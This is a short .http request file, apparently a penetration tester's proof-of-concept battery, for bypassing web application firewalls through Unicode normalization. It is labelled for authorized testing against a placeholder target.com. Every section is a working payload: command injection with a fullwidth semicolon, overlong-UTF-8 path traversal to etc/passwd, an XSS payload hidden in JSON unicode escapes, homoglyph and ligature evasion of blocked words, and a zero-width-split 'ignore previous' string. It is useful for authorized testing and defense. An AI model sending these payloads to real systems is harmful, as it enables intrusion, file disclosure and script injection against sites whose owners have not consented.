###
# ============================================================================
# Safe PoC -> x8bitranjit
# Unicode / normalization / overlong-encoding WAF battery (.http format).
# WHY: blocklists match ASCII forms; the app's parser normalizes AFTER the
# WAF - reassembling blocked tokens from lookalikes. Authorized testing only.
# WHAT TO EDIT: target.com + parameter.
# ============================================================================

### 1) fullwidth characters (U+FFxx) - normalize to ASCII post-filter
GET https://target.com/api/ping?host=127.0.0.1%EF%BC%9Bid HTTP/1.1
Host: target.com

### 2) zero-width joiner inside blocked keyword (i\u200bgnore)
GET https://target.com/search?q=i%E2%80%8Bgnore%E2%80%8B+previous HTTP/1.1
Host: target.com

### 3) homoglyph swap in a blocked word (Cyrillic a -> Latin lookalike)
GET https://target.com/search?q=%D0%B0dmin HTTP/1.1
Host: target.com

### 4) UTF-8 overlong traversal (classic: ..%c0%af)
GET https://target.com/static?path=..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
Host: target.com

### 5) ideographic full stop / fullwidth solidus (path separators)
GET https://target.com/static?path=..%E3%80%82..%E3%80%82etc HTTP/1.1
Host: target.com

### 6) unicode escapes INSIDE JSON strings (decode happens app-side)
POST https://target.com/api/comment HTTP/1.1
Host: target.com
Content-Type: application/json

{"comment":"\u003cimg src=x onerror=alert(document.domain)\u003e"}

### 7) NFKC-normalizing stacks: ligature/compat forms
GET https://target.com/search?q=%EF%AC%81lter HTTP/1.1
Host: target.com

### 8) verify normalization which side (echo endpoint)
GET https://target.com/echo?q=%EF%BC%9B HTTP/1.1
Host: target.com
